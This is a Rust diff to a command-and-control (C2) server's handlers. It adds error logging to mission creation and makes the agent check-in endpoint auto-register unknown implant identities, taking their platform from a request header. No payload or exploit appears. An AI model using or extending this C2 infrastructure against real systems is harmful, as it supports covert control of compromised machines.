@@ -1,10 +1,16 @@
+use std::str::FromStr;
+
 use axum::{
     extract::{Path, State},
-    http::StatusCode,
+    http::{HeaderMap, StatusCode},
     response::IntoResponse,
     Json,
 };
-use common::model::{self, Mission};
+use base64::{prelude::BASE64_STANDARD, Engine as _};
+use common::{
+    model::{self, Mission},
+    PLATFORM_HEADER,
+};
 use tracing::{debug, error, warn};
 
 use crate::{routes::AGENT_NOT_FOUND, services, C2State};
@@ -13,18 +19,18 @@ use super::MISSION_NOT_FOUND;
 
 pub async fn create(State(c2_state): State<C2State>, body: Json<Mission>) -> impl IntoResponse {
     debug!("{body:#?}");
-    if let Ok(mission) =
-        services::missions::create(c2_state.conn.clone(), body.agent_id, body.task.clone())
-    {
-        (StatusCode::CREATED, Json(mission)).into_response()
-    } else {
-        (StatusCode::INTERNAL_SERVER_ERROR).into_response()
+    match services::missions::create(c2_state.conn.clone(), body.agent_id, body.task.clone()) {
+        Ok(mission) => (StatusCode::CREATED, Json(mission)).into_response(),
+        Err(e) => {
+            error!("{e}");
+            (StatusCode::INTERNAL_SERVER_ERROR).into_response()
+        }
     }
 }
 
 pub async fn get_next(
     State(mut c2_state): State<C2State>,
-    // headers: HeaderMap,
+    headers: HeaderMap,
     crypto_negociation: Json<model::CryptoNegociation>,
 ) -> impl IntoResponse {
     if let Err(e) = crypto_negociation.verify() {
@@ -35,16 +41,40 @@ pub async fn get_next(
     let agent =
         match services::agents::get_by_identity(c2_state.conn.clone(), crypto_negociation.identity)
         {
-            Ok(Some(agent)) => agent,
-            Ok(None) => {
-                warn!("Agent not found");
-                return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
-            }
+            Ok(agent) => agent,
             Err(e) => {
                 error!("{e}");
                 return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
             }
         };
+
+    let agent = match agent {
+        Some(agent) => agent,
+        None => {
+            warn!("Agent not found, creating new one");
+
+            let platform = headers
+                .get(PLATFORM_HEADER)
+                .and_then(|platform| model::Platform::from_str(platform.to_str().unwrap()).ok())
+                .unwrap_or_default();
+
+            match services::agents::create(
+                c2_state.conn.clone(),
+                &format!(
+                    "Unnamed agent {}",
+                    BASE64_STANDARD.encode(&crypto_negociation.identity)
+                ),
+                crypto_negociation.identity,
+                platform,
+            ) {
+                Ok(agent) => agent,
+                Err(e) => {
+                    error!("{e}");
+                    return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
+                }
+            }
+        }
+    };
 
     if let Err(e) = services::agents::seen(c2_state.conn.clone(), agent.id) {
         error!("{e}");
